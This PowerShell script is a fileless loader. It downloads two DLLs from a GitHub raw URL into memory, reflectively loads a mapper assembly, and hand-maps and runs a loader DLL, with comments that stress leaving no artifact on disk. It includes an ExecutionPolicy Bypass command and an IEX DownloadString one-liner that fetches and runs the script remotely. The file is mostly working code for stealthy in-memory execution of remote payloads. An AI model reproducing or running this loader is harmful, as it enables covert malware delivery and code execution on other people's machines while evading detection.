<#
    Fileless loader entry point.

    Downloads the loader DLL and its in-memory mapper, maps the loader into this
    PowerShell process and lets it run. Nothing is written to disk anywhere in
    the chain:

      - WebClient.DownloadData holds both images in managed byte arrays
      - Assembly.Load(byte[]) loads the mapper without a shadow copy
      - the loader is mapped by hand and entered through its module entry point

    Windows PowerShell 5.1 is fine. It is also the reason the mapper is a
    prebuilt assembly rather than an Add-Type block: 5.1's Add-Type compiles to a
    temporary file, which is the one artifact this is trying to avoid.

    Two ways in:

      powershell -NoProfile -ExecutionPolicy Bypass -File run.ps1
      powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('<raw url to run.ps1>')"

    The second is the one-liner. It passes no arguments, so $Base keeps its
    default - which is the only thing that needs editing after the first push.
#>
param(
    # Raw base URL of the folder holding the two DLLs. Swap in your own repo.
    [string]$Base = 'https://raw.githubusercontent.com/itzohio/vigilant-memory/main',

    # Local folder to read the two DLLs from instead of downloading. Dev only.
    [string]$Local,

    # Only needed for a private repo: raw.githubusercontent.com does not serve
    # private content unauthenticated. A fine-grained PAT with Contents:Read on
    # this one repo is enough. Leave empty for a public repo.
    [string]$Token,

    # How long to wait for the loader to report back, in milliseconds.
    [int]$Timeout = 30000
)

$ErrorActionPreference = 'Stop'
$StatusName = 'Local\wofy.loader.status'

if ([IntPtr]::Size -ne 8) {
    throw 'This must run under 64-bit PowerShell (System32\WindowsPowerShell\v1.0\powershell.exe).'
}

function Get-Image([string]$Name) {
    if ($Local) {
        $Path = Join-Path $Local $Name
        if (-not (Test-Path -LiteralPath $Path)) {
            throw "Not found: $Path"
        }
        return [System.IO.File]::ReadAllBytes($Path)
    }
    $Url = "$Base/$Name"
    $Client = New-Object System.Net.WebClient
    if ($Token) {
        $Client.Headers.Add('Authorization', "token $Token")
    }
    try {
        return $Client.DownloadData($Url)
    } finally {
        $Client.Dispose()
    }
}

# Typed on purpose. PowerShell unrolls a byte[] returned from a function into
# Object[], and Assembly.Load then picks the wrong overload - the error names the
# assembly something like '77 90 144 0 3 0 ...'. Assigning into [byte[]] puts a
# real array back in hand before anything native sees it.
[byte[]]$BootstrapBytes = Get-Image 'WofyBootstrap.dll'
[byte[]]$LoaderBytes = Get-Image 'wofy-loader.dll'

# The mapper first: it is what turns the loader's bytes into a running image.
[void][System.Reflection.Assembly]::Load($BootstrapBytes)

$Report = [Wofy.Bootstrap]::Run($LoaderBytes, $StatusName, $Timeout)
Write-Host $Report
